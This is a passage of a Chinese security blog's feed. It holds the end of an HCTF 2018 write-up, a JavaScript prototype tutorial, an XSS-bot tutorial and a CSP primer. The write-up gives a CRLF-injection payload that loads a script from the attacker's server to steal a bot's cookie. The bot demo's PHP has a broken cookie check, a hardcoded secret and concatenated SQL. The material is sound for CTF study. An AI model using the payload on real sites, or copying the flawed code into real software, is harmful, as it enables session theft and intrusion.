src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/game01.png" alt=""></p><h1 id="bottle"><a href="#bottle" class="headerlink" title="bottle"></a>bottle</h1><p>这是一个16年的cve漏洞。参考<a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html。" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html。</a><br>提交url的时候会进行302跳转。尝试头注入。<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/bottle01.png" alt=""><br>CSP头在响应的下方，直接导致CSP无效。但在302的时候无法xss，需要找到一个端口来绕过302跳转，当0或者22号端口的时候可以打到cookie，拿到cookie后到网站上使用cookie拿到flag。<br>最终payload：<code>http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:22/%0d%0aContent-Length:%2065%0d%0a%0d%0a%3Cscript%20src=http://youvps/cookie.js%3E%3C/script%3E</code><br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/bottle02.png" alt=""></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>其实还有两道web题我没有写出wp，一道ruby一道web加密码学，即使看了学长的wp依旧没能深刻理解，学习无止境吧，明年继续加油。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>Unicode 安全:<a href="http://blog.lnyas.xyz/?p=1411" title="Unicode 安全" target="_blank" rel="noopener">http://blog.lnyas.xyz/?p=1411</a><br>CVE-2016-9964:<a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html" title="CVE-2016-9964" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;上周末忙着准备期中考试，HCTF也只是匆匆看了几题，有个思路之后就没再做了，这两天趁着服务器还没关闭来重新复现一下，相比去年的HCTF，今年
      
    
    </summary>
    
    
      <category term="web" scheme="http://re0.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>浅谈JavaScript中的原型链</title>
    <link href="http://re0.top/2018/11/02/js-prototype/"/>
    <id>http://re0.top/2018/11/02/js-prototype/</id>
    <published>2018-11-02T11:32:47.000Z</published>
    <updated>2018-11-14T09:36:55.010Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Javascript是我最喜欢的几种语言之一，从暑假后半段一直到开学一直在看《Javascript高级程序设计》，我觉得这本书很好，讲得很全面，但对于js中的原型链自己还是有必要花点时间好好理一理，于是就写下此篇文章。</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>先来讲讲js中创建对象的几种方法。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一种：字面量</span></span><br><span class="line"><span class="keyword">var</span> o1 = &#123;<span class="attr">name</span>:<span class="string">'o1'</span>&#125;</span><br><span class="line"><span class="keyword">var</span> o2 = <span class="keyword">new</span> <span class="built_in">Object</span>(&#123;<span class="attr">name</span>:<span class="string">'o2'</span>&#125;)</span><br><span class="line"><span class="comment">//第二种：使用构造函数</span></span><br><span class="line"><span class="keyword">var</span> F = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>&#123;<span class="keyword">this</span>.name = name;&#125;</span><br><span class="line"><span class="keyword">var</span> o3 = <span class="keyword">new</span> F(<span class="string">'o3'</span>);</span><br><span class="line"><span class="comment">//第三种：使用Object.create</span></span><br><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">name</span>:<span class="string">'o4'</span>&#125;</span><br><span class="line"><span class="keyword">var</span> o4 = <span class="built_in">Object</span>.create(o)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o1);</span><br><span class="line"><span class="built_in">console</span>.log(o2);</span><br><span class="line"><span class="built_in">console</span>.log(o3);</span><br><span class="line"><span class="built_in">console</span>.log(o4);</span><br></pre></td></tr></table></figure><br>让我们看看结果：<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/js-prototype/01.png" alt=""><br>3种创建方法返回的结果是不一样的。这就和这篇文章要讲的有关系。</p><h1 id="原型-amp-amp-原型链"><a href="#原型-amp-amp-原型链" class="headerlink" title="原型&amp;&amp;原型链"></a>原型&amp;&amp;原型链</h1><p>先上两张《js高级程序设计》中关于原型链的图片<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/js-prototype/02.png" alt=""><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/js-prototype/03.png" alt=""><br>这两张图对于萌新甚至是某些老手都没理解清楚。<br>我自己做了一张流程图，下面我们就来细说图中的名词。<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/js-prototype/04.png" alt=""><br><b>让我们从实例出发：</b><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> F = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>&#123;<span class="keyword">this</span>.name = name;&#125;</span><br><span class="line"><span class="keyword">var</span> o3 = <span class="keyword">new</span> F(<span class="string">'o3'</span>);</span><br></pre></td></tr></table></figure></p><p><ul><li>所谓的实例就是生成出来的对象，例如上面的例子中o3就是实例</li><li>F就是构造函数，用来提供创建对象的方法</li><li>实例中的&#95;_proto__指向原型对象</li><li>实例的构造函数的prototype也是指向的原型对象</li><li>原型对象的construor指向的是构造函数</li></ul><br>我们用console来看看<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/js-prototype/05.png" alt="">基本上就和流程图上的差不多。</p><p><b>那什么是原型链呢？</b><br>简单地说，就是由原型所组成的链，一个对象的&#95;_proto__就是它的原型，而这个原型也是一个对象，所以他也有&#95;_proto__属性，指向它的上一个原型，一直通过&#95;_proto__向上查找，直到Object的时候，这条原型链就到头了。</p><p><b>说了这么多，原型链到底有啥用？</b><br>当我们通过构造函数创建了许多实例，如果某些对象要增加方法，一个个去实例中添加就很繁琐，这时我们可以将方法添加到原型中，使这个原型的所有实例都有这个方法。举个代码例子：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> F = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>&#123;<span class="keyword">this</span>.name = name;&#125;</span><br><span class="line"><span class="keyword">var</span> o3 = <span class="keyword">new</span> F(<span class="string">'o3'</span>);</span><br><span class="line"><span class="keyword">var</span> o5 = <span class="keyword">new</span> F(<span class="string">'o5'</span>);</span><br><span class="line">o3.__proto__.say=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="string">'hello JavaScript'</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">o3.say()</span><br><span class="line">o5.say()</span><br></pre></td></tr></table></figure><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/js-prototype/06.png" alt="">我们可以发现打印出了相同字符串。</p><p><b>原型链的另一个作用就是继承，再举个简单的小例子：</b><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Father = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>&#123;<span class="keyword">this</span>.name = name;&#125;;</span><br><span class="line">Father.prototype.say=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="string">"hello world!"</span>)&#125;;</span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> Father(<span class="string">"javascript"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">Son.prototype = a;</span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> Son()</span><br><span class="line">b.say();</span><br></pre></td></tr></table></figure><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/js-prototype/07.png" alt=""><br>这里可以很清楚，b中并没有say这个方法，而是从father那边继承过来的，我们可以看看Son.prototype<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/js-prototype/08.png" alt="">可以看到原型链一直到Object。</p><p><b>回到最初创建对象的方法。</b><br>第一种就直接使用Object类来创建实例，所以&#95;_proto__直接指向了Object;第二种方法使用了构造函数，可以看到o3的&#95;_proto__指向了<strong>函数构造出来的对象(原型对象)</strong>，而这个对象的&#95;_proto__s指向的是Object；<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/js-prototype/09.png" alt="">最后第三种方法使用了Object.create。<b>MDN的文档中给出：Object.create()方法创建一个新对象，使用现有的对象来提供新创建的对象的&#95;_proto__。 </b><br>所以o4.&#95;_proto__指向的是它的父对象(允许我这么叫它)，而o4.&#95;_proto__.&#95;_proto__指向的才是Object。<br>这也就是为什么三种方式在console里面返回的结果不同。至于使用构造函数创建的o3在console里为什么会这么显示，让人觉得o3.&#95;_proto__指向Object就不得而知了。<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/js-prototype/10.png" alt=""></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对于js，原型链一直是它的难点和重点，这次通过简单的复习和梳理再次学习了一下。<br>写下这篇文章也算是对JavaScript的一种喜爱和敬畏吧，对于原型链也只是了解了皮毛，希望今后对js的学习可以更加深入。<br>如有错误或者讲的不当的地方请与我联系。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《JavaScript高级程序设计》<br><a href="https://www.cnblogs.com/chengzp/p/prototype.html" target="_blank" rel="noopener">https://www.cnblogs.com/chengzp/p/prototype.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;Javascript是我最喜欢的几种语言之一，从暑假后半段一直到开学一直在看《Javascript高级程序设计》，我觉得这本书很好，讲得很全
      
    
    </summary>
    
    
      <category term="web" scheme="http://re0.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>从零开始完成xssbot</title>
    <link href="http://re0.top/2018/10/10/xssbot1/"/>
    <id>http://re0.top/2018/10/10/xssbot1/</id>
    <published>2018-10-10T14:20:28.000Z</published>
    <updated>2018-10-14T09:46:12.744Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前一阵子开始研究了一下xssbot，在网上找了许多文章，但这些文章重点都放在bot代码部分，对其完整网站的实现并不是说的挺清楚，这篇文章总结了我从入门到编写一个完整xss demo的心得。</p><h1 id="bot原型"><a href="#bot原型" class="headerlink" title="bot原型"></a>bot原型</h1><h2 id="bot做些什么？"><a href="#bot做些什么？" class="headerlink" title="bot做些什么？"></a>bot做些什么？</h2><p>在我看来，bot就是代替管理员去点击页面，然后获取内容，执行js。所以对于bot来说，就是能够执行js。</p><h2 id="bot准备"><a href="#bot准备" class="headerlink" title="bot准备"></a>bot准备</h2><p>一般来说现在的xssbot基本上是通过python或者java实现。这里我们采用python+selenium+webdriver。<br>而webdriver又有chrome webdriver，Firefox webdriver，phantomjs。</p><h3 id="selenium"><a href="#selenium" class="headerlink" title="selenium"></a>selenium</h3><p>selenium是用来控制webdriver的，在python中直接使用pip安装之后便可导入。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> selenium</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver  </span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> WebDriverException</span><br></pre></td></tr></table></figure></p><h3 id="chrome-webdriver"><a href="#chrome-webdriver" class="headerlink" title="chrome webdriver"></a>chrome webdriver</h3><p>如果bot运行在windows上，我建议使用chrome webdriver。如果要使用chrome webdriver，不仅要安装chrome，还必须在谷歌官网下载webdriver。<br><a herf="https://sites.google.com/a/chromium.org/chromedriver/downloads">https://sites.google.com/a/chromium.org/chromedriver/downloads</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> selenium</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver  </span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> WebDriverException</span><br><span class="line">chromedriver = <span class="string">"C:\chromedriver.exe"</span> </span><br><span class="line">browser = webdriver.Chrome(chromedriver) </span><br><span class="line">url = <span class="string">"http://www.baidu.com"</span></span><br><span class="line">browser.get(url)</span><br><span class="line">browser.quit()</span><br></pre></td></tr></table></figure></p><h3 id="firefox-webdriver"><a href="#firefox-webdriver" class="headerlink" title="firefox webdriver"></a>firefox webdriver</h3><p>firefox与chrome类似，需要一个geckodriver。<br><a href="https://github.com/mozilla/geckodriver/releases/" target="_blank" rel="noopener">https://github.com/mozilla/geckodriver/releases/</a><br>在ubuntu下使用firefox较为简单，因为firebox可直接使用apt安装，然后把geckodriver添加到/bin/并赋予执行权限就可以了。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> selenium</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver  </span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> WebDriverException</span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">url = <span class="string">"http://www.baidu.com"</span></span><br><span class="line">browser.get(url)</span><br><span class="line">browser.quit()</span><br></pre></td></tr></table></figure></p><h3 id="phantomjs"><a href="#phantomjs" class="headerlink" title="phantomjs"></a>phantomjs</h3><p>phantomjs的优势是并不需要浏览器的支持，而且支持多平台。由于网上爬虫案例很多这里便不再多讲。</p><h2 id="bot实现"><a href="#bot实现" class="headerlink" title="bot实现"></a>bot实现</h2><p>chrome和firebox的webdriver都需要桌面，而由于我们部署ctf题目通常是在linux服务器上，所以通常需要一个虚拟的桌面。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyvirtualdisplay <span class="keyword">import</span> Display</span><br><span class="line">display = Display(visible=<span class="number">0</span>, size=(<span class="number">800</span>,<span class="number">800</span>))</span><br><span class="line">display.start()</span><br></pre></td></tr></table></figure><br>再加上上面的两种webdriver代码，如此我们便可以运行一个具有浏览器特性的bot。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyvirtualdisplay <span class="keyword">import</span> Display</span><br><span class="line"><span class="keyword">import</span> selenium</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver  </span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> WebDriverException</span><br><span class="line">display = Display(visible=<span class="number">0</span>, size=(<span class="number">800</span>,<span class="number">800</span>))</span><br><span class="line">display.start()</span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">url = <span class="string">"http://www.baidu.com"</span></span><br><span class="line">browser.get(url)</span><br><span class="line">browser.quit()</span><br></pre></td></tr></table></figure></p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>上面我们讲了如何实现bot本身，现在来讲讲如何完成一个完整的留言型xss demo。一种基本的思路如下：<br>1.用户提交留言到数据库，并设置验证码保证恶意刷payload导致bot卡死。<br>2.数据库添加一栏是否被bot访问的标志位。<br>3.后端提供访问接口，避免bot远程访问数据库，引起不必要的麻烦。<br>4.后端以cookie或者ip来判断是否是bot访问。<br>5.bot访问一条数据后，将标志位update，说明该条留言已经被bot访问过。<br>按照此思路我们可以写出后端管理员页面的代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//admin666.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//取出一条isread为0的未读消息，将content放在网页上，并update isread</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"db.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">'key'</span>]) &amp;&amp; $_COOKIE[<span class="string">'key'</span>] !== <span class="string">"admin123!@#"</span>)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"you are not admin!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">$query1 = <span class="string">"select * from content where isread = '0' limit 1"</span>;</span><br><span class="line">$result = $mysqli-&gt;query($query1);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no message unread."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $row = $result-&gt;fetch_array();</span><br><span class="line">    $contentid = $row[<span class="string">'contentid'</span>];</span><br><span class="line">    $content = $row[<span class="string">'content'</span>];</span><br><span class="line">    <span class="keyword">echo</span>($content);</span><br><span class="line">    $query2 = <span class="string">"update content set isread = 1 where contentid ='"</span>.$contentid.<span class="string">"'"</span>;</span><br><span class="line">    $mysqli-&gt;query($query2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>所以我们也可以完成bot部分的代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> selenium                                                             </span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver                                              </span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> WebDriverException                   </span><br><span class="line"><span class="keyword">import</span> time                                                                 </span><br><span class="line"><span class="keyword">from</span> pyvirtualdisplay <span class="keyword">import</span> Display                                        </span><br><span class="line">                                                                         </span><br><span class="line">url=<span class="string">'http://127.0.0.1/admin666.php'</span>                                                                                     </span><br><span class="line">display = Display(visible=<span class="number">0</span>,size=(<span class="number">800</span>,<span class="number">600</span>))                                 </span><br><span class="line">display.start()                                                             </span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:                                                                    </span><br><span class="line">    <span class="keyword">try</span>:                                                                    </span><br><span class="line">        browser = webdriver.Firefox()                                       </span><br><span class="line">        browser.get(url)                                                    </span><br><span class="line">        browser.add_cookie(&#123;<span class="string">'name'</span>:<span class="string">'key'</span>,<span class="string">'value'</span>:<span class="string">'admin123!@#'</span>,<span class="string">'path'</span>:<span class="string">'/'</span>&#125;) </span><br><span class="line">        browser.get(url)                                                    </span><br><span class="line">        time.sleep(<span class="number">1</span>)                                                       </span><br><span class="line">        browser.quit()                                                      </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:                                                  </span><br><span class="line">        <span class="keyword">print</span> (e)                                                           </span><br><span class="line">        <span class="keyword">continue</span>                                                            </span><br></pre></td></tr></table></figure><br>如此我们便实现了一个简单的留言型xss demo，虽然需要后端支持，但相对来说较为安全。希望能有更好的方法来实现。<br>代码已上传至GitHub：<br><a href="https://github.com/zer0e/xssbot_1/" target="_blank" rel="noopener">https://github.com/zer0e/xssbot_1/</a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>学长的文章—&gt;&gt;<a href="http://www.freebuf.com/articles/web/133456.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/133456.html</a><br><a href="https://www.bubbles966.cn/blog/2017/10/29/xssbot-with-firefox/" target="_blank" rel="noopener">https://www.bubbles966.cn/blog/2017/10/29/xssbot-with-firefox/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;前一阵子开始研究了一下xssbot，在网上找了许多文章，但这些文章重点都放在bot代码部分，对其完整网站的实现并不是说的挺清楚，这篇文章总结
      
    
    </summary>
    
    
      <category term="web" scheme="http://re0.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>浅谈CSP内容安全策略</title>
    <link href="http://re0.top/2018/07/12/csp/"/>
    <id>http://re0.top/2018/07/12/csp/</id>
    <published>2018-07-12T14:20:28.000Z</published>
    <updated>2018-11-14T09:33:59.406Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CSP策略全称为Content Security Policy，是以白名单的机制对网站加载或者执行的资源起作用。CSP通常以HTTP头信息或者meta元素定义，可以较好的防御dom xss。</p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>1.使用meta标签，直接在页面中定义csp<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-security-policy"</span> <span class="attr">content</span>=<span class="string">"策略"</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这种方式较为简单，但需要每个页面都添加，较为繁琐。</p><p>2.使用HTTP头定义CSP<br>Apache :</p><p>Add the following to your httpd.conf in your VirtualHost or in an .htaccess file:</p><p>Header set Content-Security-Policy “default-src ‘self’;”</p><p>Nginx :</p><p>In your server {} block add:</p><p>add_header Content-Security-Policy “default-src ‘self’;”</p><p>也可使用PHP设置http头:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Security-Policy: default-src 'self'"</span>);</span><br></pre></td></tr></table></figure></p><h1 id="CSP的书写规则"><a href="#CSP的书写规则" class="headerlink" title="CSP的书写规则"></a>CSP的书写规则</h1><p>举个例子<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//限制所有外部资源，所有资源只能从当前域名加载</span><br><span class="line">Content-Security-Policy: default-src 'self'</span><br><span class="line">//也可以指定资源网站</span><br><span class="line">Content-Security-Policy: default-src http://xxx.com</span><br></pre></td></tr></table></figure><br>default-src是CSP指令，多个指令用分号分隔，指令值用空格分隔，如：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src http://xxx.com; script-src http://aaa.com http://bbb.com</span><br></pre></td></tr></table></figure><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//通过report-uri指令发送拦截报告到指定地址</span><br><span class="line">Content-Security-Policy: default-src &apos;self&apos;; report-uri /report-uri;</span><br><span class="line">//报告通常为：</span><br><span class="line">&#123;</span><br><span class="line">  &quot;csp-report&quot;: &#123;</span><br><span class="line">    &quot;document-uri&quot;: &quot;http://example.com/signup.html&quot;,</span><br><span class="line">    &quot;referrer&quot;: &quot;&quot;,</span><br><span class="line">    &quot;blocked-uri&quot;: &quot;http://example.com/css/style.css&quot;,</span><br><span class="line">    &quot;violated-directive&quot;: &quot;style-src cdn.example.com&quot;,</span><br><span class="line">    &quot;original-policy&quot;: &quot;default-src &apos;none&apos;; style-src cdn.example.com; report-uri /_/csp-reports&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="常用的CSP指令"><a href="#常用的CSP指令" class="headerlink" title="常用的CSP指令"></a>常用的CSP指令</h1><table><thead><tr><th>指令</th><th align="center">指令和指令值示例</th><th align="right">指令说明</th></tr></thead><tbody><tr><td>default-src</td><td align="center">‘self’ cdn.example.com</td><td align="right">默认加载策略</td></tr><tr><td>script-src</td><td align="center">‘self’ js.example.com</td><td align="right">对 JavaScript 的加载策略。</td></tr><tr><td>style-src</td><td align="center">‘self’ css.example.com</td><td align="right">对样式的加载策略。</td></tr><tr><td>img-src</td><td align="center">‘self’ img.example.com</td><td align="right">对图片的加载策略。</td></tr><tr><td>connect-src</td><td align="center">‘self’</td><td align="right">对 Ajax、WebSocket 等请求的加载策略。不允许的情况下，浏览器会模拟一个状态为 400 的响应。</td></tr><tr><td>font-src</td><td align="center">font.cdn.example.com</td><td align="right">针对 WebFont 的加载策略。</td></tr><tr><td>object-src</td><td align="center">‘self’</td><td align="right">针对 、 或  等标签引入的 flash 等插件的加载策略。</td></tr><tr><td>media-src</td><td align="center">media.cdn.example.com</td><td align="right">针对媒体引入的 HTML 多媒体的加载策略。</td></tr><tr><td>frame-src</td><td align="center">‘self’</td><td align="right">针对 frame 的加载策略。</td></tr><tr><td>report-uri</td><td align="center">/report-uri</td><td align="right">告诉浏览器如果请求的资源不被策略允许时，往哪个地址提交日志信息。 特别的：如果想让浏览器只汇报日志，不阻止任何内容，可以改用 Content-Security-Policy-Report-Only 头。</td></tr><tr><td>sandbox</td><td align="center"></td><td align="right">设置沙盒环境</td></tr><tr><td>child-src</td><td align="center"></td><td align="right">主要防御 <code>&lt;frame&gt;</code>,<code>&lt;iframe&gt;</code></td></tr><tr><td>form-action</td><td align="center"></td><td align="right">主要防御 <code>&lt;form&gt;</code></td></tr><tr><td>frame-ancestors</td><td align="center"></td><td align="right">主要防御 <code>&lt;frame&gt;</code>,<code>&lt;iframe&gt;</code>,<code>&lt;object&gt;</code>,<code>&lt;embed&gt;</code>,<code>&lt;applet&gt;</code></td></tr><tr><td>plugin-types</td><td align="center"></td><td align="right">主要防御 <code>&lt;object&gt;</code>,<code>&lt;embed&gt;</code>,<code>&lt;applet&gt;</code></td></tr></tbody></table><h1 id="CSP指令值"><a href="#CSP指令值" class="headerlink" title="CSP指令值"></a>CSP指令值</h1><table><thead><tr><th>指令值</th><th align="center">指令和指令值示例</th><th align="right">指令值说明</th></tr></thead><tbody><tr><td><em></em></td><td align="center">img-src </td><td align="right">允许任何内容。</td></tr><tr><td>‘none’</td><td align="center">img-src ‘none’</td><td align="right">不允许任何内容。</td></tr><tr><td>‘self’</td><td align="center">img-src ‘self’</td><td align="right">允许来自相同来源的内容（相同的协议、域名和端口）。</td></tr><tr><td>data:</td><td align="center">img-src data:</td><td align="right">允许 data: 协议（如 base64 编码的图片）。</td></tr><tr><td>example.com</td><td align="center">img-src img.example.com</td><td align="right">允许加载指定域名的资源。</td></tr><tr><td><em>.example.com</em></td><td align="center">img-src .example.com</td><td align="right">允许加载 